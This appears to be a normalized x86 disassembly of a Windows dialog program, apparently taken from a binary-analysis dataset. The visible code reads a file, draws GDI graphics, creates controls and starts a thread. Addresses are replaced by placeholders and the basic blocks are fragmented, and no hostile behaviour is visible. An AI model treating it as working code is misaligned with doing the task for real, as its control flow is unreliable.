mov ecx [ ebx + esi * 4 + 0x200054 ]
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] ebp
mov [ esp + 0x3c ] 0x0
mov esi ecx
imul esi esi 0x70
mov edx [ esi + edi + 0x18 ]
cmp edx 0x10
lea eax [ esi + edi ]
mov [ esp + 0x4f8 ] 0x3
jb r-xdata
mov edi [ esp + 0x30 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
add ebp edi
inc ecx
cmp ecx edx
mov [ esp + 0x1c ] ecx
jl r-xdata
mov edx [ ebp + edi * 4 ]
mov ecx edx
and ecx 0x7
shr edx 0x3
mov ebx 0x1
lea esi [ edx + eax + 0x4c ]
mov dl [ esi ]
shl ebx cl
test dl bl
jne r-xdata
mov esi [ esp + 0x500 ]
mov esi [ esp + 0x24 ]
mov edx [ esp + 0x500 ]
xor ecx ecx
test esi esi
jle r-xdata
mov eax [ esp + 0x500 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x500 ]
lea esi [ ebp + 0x1 ]
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax + 0x44 ]
test cl cl
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x24 ]
inc edi
cmp edi ecx
jl r-xdata
mov bl 0x1
shl bl cl
mov ecx [ esp + 0x10 ]
or bl dl
inc ecx
mov [ esi ] bl
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x24 ]
xor eax eax
test ecx ecx
jle r-xdata
mov esi [ esp + 0x30 ]
mov eax [ esp + 0x18 ]
add ebp esi
inc ebx
cmp ebx eax
jl r-xdata
mov edi [ esp + 0x10 ]
mov cl [ eax + 0x44 ]
test cl cl
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x1c ]
add esi 0x3
dec ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov bl 0x1
shl bl cl
mov ecx [ esp + 0x10 ]
or bl dl
inc ecx
mov [ edi ] bl
mov [ esp + 0x10 ] ecx
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] ebp
mov [ esp + 0x3c ] 0x0
cmp [ eax + 0x38 ] 0xffffffff
je r-xdata
mov [ esp + 0x14 ] edx
mov [ esp + 0x20 ] ebp
mov edx [ eax + 0x30 ]
xor bl bl
cmp edx ebp
je r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x18 ]
add ebp eax
mov eax [ esp + 0x1c ]
inc eax
cmp eax ecx
mov [ esp + 0x1c ] eax
jl r-xdata
mov [ esp + 0x14 ] ecx
lea ebx [ ebx ]
mov al [ edx + 0x44 ]
test al al
je r-xdata
jmp r-xdata
inc ecx
cmp ecx esi
jl r-xdata
mov [ eax ] 0x1
inc edi
movzx ecx [ esi - 0x1 ]
xor edx edx
mov dh [ esi + 0x1 ]
mov ebx 0x1
mov dl [ esi ]
shl edx 0x8
or edx ecx
mov ecx edx
and ecx 0x7
shr edx 0x3
lea edi [ edx + eax + 0x4c ]
mov dl [ edi ]
shl ebx cl
test dl bl
jne r-xdata
jmp r-xdata
cmp [ rw-data ] ebp
je r-xdata
mov al [ esi + 0x44 ]
test al al
je r-xdata
mov ecx [ esp + 0x14 ]
add eax edi
dec ecx
mov [ esp + 0x14 ] ecx
jne r-xdata
mov [ ecx ] 0x1
inc [ esp + 0x10 ]
movzx eax [ ecx + ebp ]
cmp [ eax + edx + 0x4c ] 0x0
lea eax [ eax + edx + 0x4c ]
jne r-xdata
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x30 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
add ebp edi
inc ecx
cmp ecx edx
mov [ esp + 0x14 ] ecx
jl r-xdata
mov esi [ rw-data ]
cmp esi ebp
je r-xdata
push 0x1
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
push eax
call sub_4af910
mov eax [ esp + 0x44 ]
add esp 0x10
cmp eax ebp
je r-xdata
mov edx eax
sar edx 0x3
mov dl [ edx + ebp ]
mov cl al
and cl 0x7
shr dl cl
and dl bl
movzx edx dl
lea ecx [ edx + esi + 0x4c ]
cmp [ ecx ] 0x0
jne r-xdata
mov ecx [ eax + 0x40 ]
cmp ecx 0x1
je r-xdata
mov edx [ rw-data ]
sub edx esi
sar edx 0x2
cmp edx ebp
jbe r-xdata
cmp [ esp + 0x20 ] ebp
je r-xdata
push ebp
push ebp
push 0x3
push ebp
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp ecx 0x2
je r-xdata
mov edx [ esi + ecx * 4 ]
cmp edx ebp
je r-xdata
mov edx [ rw-data ]
lea eax [ esi + edx ]
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
push eax
call sub_4adff0
add esp 0xc
jmp r-xdata
xor bl bl
push 0x0
push edi
call [ GetFileSize@IAT ]
mov ebp eax
push ebp
push 0x0
call [ LocalAlloc@IAT ]
test eax eax
mov [ esp + 0x20 ] eax
je r-xdata
push ebp
push ebp
push ebp
lea ecx [ esp + 0x2c ]
push ecx
push eax
call sub_4053a0
add esp 0x14
mov bl 0x1
mov eax edx
mov [ esp + 0x20 ] eax
xor bl bl
jmp r-xdata
mov eax [ esp + 0x20 ]
cmp eax ebp
je r-xdata
push edi
call [ CloseHandle@IAT ]
xor ebp ebp
jmp r-xdata
push 0x0
lea ecx [ esp + 0x58 ]
push ecx
push ebp
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x50 ] 0x10
jb r-xdata
mov ecx [ esp + 0x2c ]
lea edx [ esp + 0x38 ]
push edx
push eax
mov eax [ esp + 0x1c ]
push eax
call sub_43eb10
test eax eax
je r-xdata
mov bl 0x1
mov edx [ esp + 0x3c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
test bl bl
je r-xdata
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x500 ]
imul edx edx 0x1c
push 0xffffffff
push ebp
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ edx + eax + 0xc ]
call sub_401dd0
mov ecx [ esp + 0x20 ]
push ecx
call [ LocalFree@IAT ]
sub_4365a0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c011f
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x4ac
cmp eax 0x138
push ebx
push ebp
push esi
push edi
ja r-xdata
sub eax 0x1401
je r-xdata
je r-xdata
mov edx [ esp + 0x4cc ]
lea ecx [ esp + 0x4c ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov ecx [ rw-data ]
xor edi edi
cmp ecx edi
je r-xdata
sub eax 0x6
je r-xdata
mov eax [ esp + 0x4d8 ]
push eax
call [ GetDlgCtrlID@IAT ]
cmp eax 0x200
jge r-xdata
sub eax 0x2
je r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] edi
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x4c4 ] 0x1
mov [ esp + 0x1c ] edi
mov ebp [ esp + 0x4cc ]
mov ebx [ GetDlgItem@IAT ]
mov [ esp + 0x4c4 ] 0x2
mov [ esp + 0x40 ] edi
mov edi edi
cmp [ ecx + 0x48 ] edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x300
jge r-xdata
mov esi [ esp + 0x4d4 ]
push 0x1
push esi
call [ SetBkMode@IAT ]
mov ecx [ rw-data ]
push ecx
call [ UnrealizeObject@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call [ SetBrushOrgEx@IAT ]
mov edx [ rw-data ]
push edx
push esi
call [ SelectObject@IAT ]
mov eax [ rw-data ]
jmp r-xdata
mov edx [ rw-data ]
mov esi [ DeleteObject@IAT ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov ecx [ rw-data ]
xor edi edi
cmp ecx edi
je r-xdata
sub eax 0x10e
je r-xdata
mov esi [ esp + 0x38 ]
add esi eax
push ecx
mov [ ecx ] esi
cmp [ esp + 0x40 ] edx
mov ecx [ esp + 0x2c ]
mov eax esp
jae r-xdata
lea eax [ esp + 0x28 ]
cmp ecx edi
mov esi ecx
je r-xdata
push rw-data
lea ecx [ esp + 0x48 ]
call sub_4014e0
mov eax [ rw-data ]
mov [ eax + 0x44 ] 0x0
mov eax [ eax + 0x48 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
mov edx [ ecx + 0x48 ]
push edx
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x44 ]
call sub_404410
mov ecx [ rw-data ]
mov eax 0x1
mov esi [ esp + 0x4d4 ]
mov ecx [ eax + esi * 4 + 0x4 ]
test ecx ecx
jle r-xdata
mov ecx [ esp + 0x4bc ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x4b8
retn 0x10
push 0x0
call [ GetStockObject@IAT ]
jmp r-xdata
mov esi [ esp + 0x4d4 ]
push 0x1
push esi
call [ SetBkMode@IAT ]
mov eax [ rw-data ]
push eax
call [ UnrealizeObject@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call [ SetBrushOrgEx@IAT ]
mov ecx [ rw-data ]
push ecx
push esi
call [ SelectObject@IAT ]
mov eax [ rw-data ]
jmp r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp [ ecx + 0x48 ] edi
je r-xdata
mov edx [ rw-data ]
mov esi [ GetWindowRect@IAT ]
lea ecx [ esp + 0x4c ]
push ecx
push edx
call esi
mov edi [ esp + 0x4cc ]
lea eax [ esp + 0x5c ]
push eax
push edi
call esi
mov ebx [ esp + 0x68 ]
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x58 ]
sub eax ebx
sub eax ecx
mov ebx [ esp + 0x54 ]
add eax edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
mov ecx [ esp + 0x64 ]
push 0x5
push 0x0
push 0x0
push eax
mov eax [ esp + 0x6c ]
sub eax ecx
mov ecx [ esp + 0x5c ]
sub eax ecx
add eax ebx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
push 0x0
push edi
call [ SetWindowPos@IAT ]
lea ecx [ esp + 0x5c ]
push ecx
push edi
call [ GetClientRect@IAT ]
push edi
call [ GetDC@IAT ]
mov ebx eax
push ebx
call [ CreateCompatibleDC@IAT ]
push 0xc
push 0x8
push ebx
mov esi eax
call [ CreateCompatibleBitmap@IAT ]
mov ebp [ SelectObject@IAT ]
push eax
push esi
mov [ rw-data ] eax
call ebp
push 0xc8c8c8
push 0x1
push 0x2
call [ CreatePen@IAT ]
push eax
push esi
mov [ esp + 0x4c ] eax
call ebp
mov [ esp + 0x10 ] eax
xor eax eax
push eax
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] 0x8
mov [ esp + 0x7c ] 0xc
call [ GetStockObject@IAT ]
push eax
lea edx [ esp + 0x70 ]
push edx
push esi
call [ FillRect@IAT ]
push 0x0
push 0xb
push 0x0
push esi
call [ MoveToEx@IAT ]
push 0xb
push 0x8
push esi
call [ LineTo@IAT ]
mov eax [ esp + 0x10 ]
push eax
push esi
call ebp
mov ecx [ esp + 0x44 ]
push ecx
call [ DeleteObject@IAT ]
push 0x9c
push 0x5a
push ebx
call [ CreateCompatibleBitmap@IAT ]
push eax
push esi
mov [ rw-data ] eax
call ebp
push 0x10
call [ GetSysColor@IAT ]
push eax
push 0x1
push 0x0
call [ CreatePen@IAT ]
push 0x16
mov [ esp + 0x14 ] eax
call [ GetSysColor@IAT ]
push eax
push 0x1
push 0x0
call [ CreatePen@IAT ]
mov [ esp + 0x44 ] eax
xor eax eax
push 0x1
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] 0x5a
mov [ esp + 0x7c ] 0x9c
call [ GetStockObject@IAT ]
push eax
lea edx [ esp + 0x70 ]
push edx
push esi
call [ FillRect@IAT ]
mov eax [ esp + 0x10 ]
push eax
push esi
call ebp
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0xb
lea esp [ esp ]
dec eax
jne r-xdata
mov [ eax ] ecx
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x2c ]
call sub_401c60
mov eax [ esp + 0x40 ]
test eax eax
mov edi 0x44
jne r-xdata
lea ecx [ esp + 0x2c ]
mov [ rw-data ] edi
call sub_435df0
push esi
call j_sub_4b66ed#2
add esp 0x4
xor ebp ebp
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebp
mov [ esp + 0x24 ] 0x0
mov eax [ esp + 0x4cc ]
lea edx [ esi + 0x200 ]
push edx
push eax
mov [ esp + 0x4cc ] ebp
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
push ebp
push ebp
mov edi eax
push 0xe
push edi
call ebx
cmp eax ebp
lea ecx [ esp + 0x20 ]
je r-xdata
cmp ecx edi
mov esi ecx
je r-xdata
mov [ ecx + 0x44 ] 0x0
mov eax [ ecx + 0x48 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
mov edx [ ecx + 0x48 ]
push edx
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
mov ecx [ esp + 0x18 ]
push 0x0
push ecx
push 0x0
push esi
call [ MoveToEx@IAT ]
mov edx [ esp + 0x18 ]
push edx
push 0x59
push esi
call [ LineTo@IAT ]
mov eax [ esp + 0x18 ]
add eax 0xc
cmp eax 0x83
mov [ esp + 0x18 ] eax
jl r-xdata
push 0x0
push 0x9b
push 0x0
push esi
call [ MoveToEx@IAT ]
push 0x9b
push 0x59
push esi
call [ LineTo@IAT ]
push 0x0
push 0x0
push 0x59
push esi
call [ MoveToEx@IAT ]
push 0x9b
push 0x59
push esi
call [ LineTo@IAT ]
mov eax [ esp + 0x44 ]
push eax
push esi
call ebp
push 0x0
push 0x0
push 0x0
push esi
call [ MoveToEx@IAT ]
push 0x0
push 0x59
push esi
call [ LineTo@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call [ MoveToEx@IAT ]
push 0x9b
push 0x0
push esi
call [ LineTo@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
push esi
call ebp
mov edx [ esp + 0x10 ]
mov ebp [ DeleteObject@IAT ]
push edx
call ebp
mov eax [ esp + 0x44 ]
push eax
call ebp
push esi
call [ DeleteDC@IAT ]
push ebx
push edi
call [ ReleaseDC@IAT ]
mov ecx [ rw-data ]
mov esi [ CreatePatternBrush@IAT ]
push ecx
call esi
mov edx [ rw-data ]
push edx
mov [ rw-data ] eax
call esi
push 0xfffffffa
push edi
mov [ rw-data ] eax
call [ GetWindowLongA@IAT ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x31
push edi
mov [ esp + 0x24 ] eax
call esi
mov [ esp + 0x3c ] eax
mov ebp 0x200
mov [ esp + 0x10 ] 0x2
mov edi edi
movzx eax [ esp + 0x4d4 ]
test eax eax
jle r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ rw-data ]
mov [ esp + 0x14 ] ecx
je r-xdata
call sub_4480e0
jmp r-xdata
push eax
call sub_401f60
mov eax [ esp + 0x38 ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x24 ]
jae r-xdata
mov [ rw-data ] edi
call sub_435df0
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x14 ]
push 0x0
push eax
lea ecx [ ebp - 0x100 ]
push ecx
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x40000804
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push 0x2
push 0x1
mov ebx eax
push 0xd3
push ebx
call esi
mov edx [ esp + 0x3c ]
push 0x0
push edx
push 0x30
push ebx
call esi
push r--data
push 0x0
push 0xc
push ebx
call esi
mov eax [ esp + 0x14 ]
push 0x0
push eax
push ebp
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x40000884
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push 0x2
push 0x1
mov ebx eax
push 0xd3
push ebx
call esi
mov ecx [ esp + 0x3c ]
push 0x0
push ecx
push 0x30
push ebx
call esi
mov edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ ebp + 0x100 ]
push eax
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x50200884
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov ecx [ esp + 0x3c ]
push 0x0
push ecx
push 0x30
push eax
call esi
mov eax [ esp + 0x10 ]
inc ebp
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
push 0x0
push 0x0
push 0x1401
push edi
call esi
jmp r-xdata
cmp eax 0x2
jg r-xdata
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x4c ]
mov esi [ esp + 0x40 ]
sub eax ecx
imul eax [ esp + 0x18 ]
push edi
push 0x9c
cdq
push 0x5a
push 0x4
sub eax edx
sar eax 0x1
push eax
push 0x0
lea eax [ esi + 0x100 ]
push eax
push ebp
call ebx
push eax
call [ SetWindowPos@IAT ]
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x44 ]
sub eax edx
imul eax [ esp + 0x18 ]
push edi
push 0x78
cdq
push ecx
sub eax edx
push 0x4
sar eax 0x1
add eax 0x5a
push eax
push 0x0
add esi 0x200
push esi
push ebp
call ebx
push eax
call [ SetWindowPos@IAT ]
push r--data
push 0x0
push 0xc
push esi
push ebp
call ebx
push eax
call [ SendMessageA@IAT ]
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x44 ]
mov esi [ esp + 0x40 ]
sub eax ecx
imul eax [ esp + 0x18 ]
push edi
push 0x24
push edx
cdq
sub eax edx
push 0x7c
sar eax 0x1
add eax 0x5a
push eax
push 0x0
add esi 0x300
push esi
push ebp
call ebx
push eax
call [ SetWindowPos@IAT ]
push r--data
push 0x0
push 0xc
push esi
push ebp
call ebx
push eax
call [ SendMessageA@IAT ]
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov eax [ esp + 0x54 ]
sub eax [ esp + 0x4c ]
sub eax 0x5a
mov [ esp + 0x44 ] eax
mov [ esp + 0x18 ] 0x0
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx [ esp + 0x34 ]
push eax
push ecx
push 0xd
push edi
call ebx
mov edx [ esp + 0x34 ]
add edx 0xfffffff3
push edx
lea ecx [ esp + 0x24 ]
call sub_401f60
mov eax [ rw-data ]
mov ecx [ eax + esi * 4 + 0x4 ]
push ecx
lea edx [ esp + 0x80 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x7c ]
push eax
lea ecx [ esp + 0x24 ]
call sub_402010
cmp [ esp + 0x38 ] ebp
mov eax [ esp + 0x24 ]
jae r-xdata
lea eax [ esp + 0x24 ]
mov eax [ esp + 0x4cc ]
push eax
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax [ esp + 0x40 ]
inc eax
cmp eax 0x2
mov [ esp + 0x40 ] eax
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov edi 0x84
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
inc [ eax + 0xd48 ]
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x54 ]
sub eax edx
sub eax 0xb4
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x44 ] eax
mov eax [ rw-data ]
xor edx edx
test eax eax
setne dl
mov [ esp + 0x18 ] edx
jmp r-xdata
push eax
push 0x0
push 0xc
push edi
call ebx
mov edx [ rw-data ]
mov ecx esi
imul ecx ecx 0x1c
lea eax [ ecx + edx + 0xc ]
cmp [ eax + 0x18 ] ebp
jb r-xdata
lea eax [ esp + 0x24 ]
mov eax [ esp + 0x38 ]
mov edx 0x10
push ecx
cmp eax edx
mov eax [ esp + 0x28 ]
mov ecx esp
jae r-xdata
push 0x200094
call sub_4b573e
add esp 0x4
mov [ esp + 0x10 ] eax
xor edi edi
cmp eax edi
mov [ esp + 0x4c4 ] 0x3
je r-xdata
mov edx [ esp + 0x14 ]
inc edx
push edx
lea eax [ esp + 0xc0 ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0xc8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x10 ] edx
je r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x14 ] ecx
mov ecx [ rw-data ]
xor edx edx
test ecx ecx
sete dl
push rw-data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x1c ] edx
call sub_40b320
mov eax [ esp + 0x10 ]
mov [ esp + 0x1c ] eax
jmp r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
xor esi esi
mov ecx eax
call sub_435d60
mov esi eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xc0 ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov esi [ esp + 0x14 ]
imul esi esi 0x70
mov edx [ ecx + esi + 0x18 ]
mov eax 0x10
cmp edx eax
jb r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
push eax
mov eax [ esp + 0x4d0 ]
push 0x0
push 0xc
add esi 0x300
push esi
push eax
call [ GetDlgItem@IAT ]
push eax
call ebx
lea ecx [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
test esi esi
mov [ esp + 0x4c4 ] 0x1
je r-xdata
mov [ esi ] ebp
mov [ esi + 0x44 ] 0x1
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov eax [ rw-data ]
cmp eax edi
mov ebx eax
je r-xdata
cmp esi edi
mov ecx esi
mov [ esp + 0x4c4 ] 0x2
mov [ rw-data ] ecx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea edi [ ecx + esi + 0x4 ]
mov edi [ ecx + esi + 0x4 ]
jmp r-xdata
cmp [ esp + 0x38 ] 0x10
jb r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
mov edi [ esi + 0x20004c ]
test edi edi
je r-xdata
inc [ eax + 0xd48 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx + esi + 0x4 ]
mov ecx [ ecx + esi + 0x4 ]
jmp r-xdata
cmp [ ecx + esi + 0x18 ] eax
jb r-xdata
mov edx [ esp + 0x24 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x20004c ] ebx
mov eax [ rw-data ]
test eax eax
lea edi [ ecx + 0x200050 ]
mov ebx eax
je r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
push eax
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
push ecx
call sub_457f90
add esp 0x4
add eax edi
mov ecx eax
lea edi [ ecx + 0x1 ]
lea ebx [ ebx ]
mov esi [ edi ]
test esi esi
je r-xdata
inc [ eax + 0xd48 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
mov ecx [ rw-data ]
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov ecx [ rw-data ]
push 0xffffffff
lea eax [ ecx + esi ]
push 0x0
push eax
lea ecx [ esp + 0x2c ]
call sub_4018c0
mov eax r--data
lea ecx [ eax + 0x1 ]
mov [ edi ] ebx
mov edx [ rw-data ]
mov [ ecx + 0x200054 ] edx
mov eax [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push 0x0
push ecx
push sub_435e70
push 0x0
push 0x0
mov [ ecx + 0x200058 ] eax
call [ CreateThread@IAT ]
mov ecx [ rw-data ]
mov [ ecx + 0x48 ] eax
dec [ esi + 0xd48 ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax [ rw-data ]
mov ecx [ eax + esi + 0x24 ]
push 0x1
lea edx [ esp + 0xc0 ]
push edx
mov edx [ eax + esi + 0x20 ]
push ecx
push edx
call sub_4359e0
lea eax [ esp + 0xcc ]
add esp 0x10
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
mov ecx [ rw-data ]
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xc0 ]
push eax
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x24 ]
push r--data
call sub_401cc0
mov ebx [ esp + 0x1c ]
mov edi [ ebx + 0xc ]
cmp edi 0x10000001
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax edi
and eax 0xff
mov [ esp + 0x3c ] eax
movzx edx [ ebx + 0x32 ]
mov [ esp + 0x3c ] edx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax [ rw-data ]
mov edx [ rw-data ]
test eax eax
lea eax [ edx + esi + 0x28 ]
je r-xdata
mov ebp [ esp + 0x3c ]
mov [ esp + 0x10 ] edi
mov eax [ ebx + 0x44c ]
cmp eax 0x10000001
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
lea ecx [ esp + 0x6c ]
push ecx
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea ecx [ esp + 0x5c ]
push ecx
lea edx [ esp + 0x70 ]
push edx
lea ecx [ esp + 0x5c ]
push ecx
push eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0xc0 ]
push edx
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov ebp eax
and ebp 0xff
mov [ esp + 0x10 ] eax
jmp r-xdata
movzx ebp [ ebx + 0x46a ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xc0 ]
push ecx
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
call [ FileTimeToSystemTime@IAT ]
movzx eax [ esp + 0x68 ]
movzx ecx [ esp + 0x66 ]
movzx edx [ esp + 0x64 ]
push eax
movzx eax [ esp + 0x66 ]
push ecx
movzx ecx [ esp + 0x66 ]
push edx
movzx edx [ esp + 0x68 ]
push eax
push ecx
push edx
lea eax [ esp + 0xd4 ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0xdc ]
add esp 0x20
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x28 ]
call sub_401cc0
mov bl [ rw-data ]
test bl bl
je r-xdata
call sub_40af00
push edi
mov esi eax
call sub_4358c0
add esp 0x4
push eax
mov eax [ esp + 0x40 ]
push eax
push esi
push 0x0
mov ecx ebx
call sub_444100
push eax
push esi
push 0x0
mov ecx ebx
call sub_4440b0
push eax
lea ecx [ esp + 0xcc ]
push r--data
push ecx
call [ wsprintfA@IAT ]
lea eax [ esp + 0xd4 ]
add esp 0x18
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
